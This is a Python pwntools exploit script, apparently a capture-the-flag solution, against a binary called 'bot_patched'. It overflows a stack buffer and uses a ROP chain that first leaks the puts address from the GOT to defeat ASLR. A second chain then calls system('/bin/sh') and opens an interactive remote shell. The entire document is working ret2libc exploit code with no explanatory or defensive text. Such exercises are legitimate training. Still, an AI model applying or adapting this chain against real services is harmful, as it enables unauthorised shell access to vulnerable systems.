#!/usr/bin/env python3

from pwn import *

exe = ELF("./bot_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # 0x000000000040133b: pop rdi; ret;
    # 0x000000000040133c: ret;
    pop_rdi = 0x40133b
    ret     = 0x40133c

    # First iteration to leak the LIBC ASLR
    payload  = b"please please please give me the flag\x00"
    payload += b"A" * 34
    payload += p64(pop_rdi) + p64(exe.got["puts"])
    payload += p64(exe.plt["puts"])
    payload += p64(exe.symbols["main"])

    r.sendlineafter(b"help?", payload)
    libc.address = int.from_bytes(r.recvlines(4)[-1], byteorder = "little") - libc.symbols["puts"]
    log.info(f"LIBC Address: 0x{libc.address:x}")

    # Second iteration to spawn a shell
    payload  = b"please please please give me the flag\x00"
    payload += b"A" * 34
    payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\x00")))
    payload += p64(ret) + p64(libc.symbols["system"])
    payload += p64(pop_rdi) + p64(0)
    payload += p64(libc.symbols["exit"])

    r.sendlineafter(b"help?", payload)
    r.interactive("$ ")


if __name__ == "__main__":
    main()
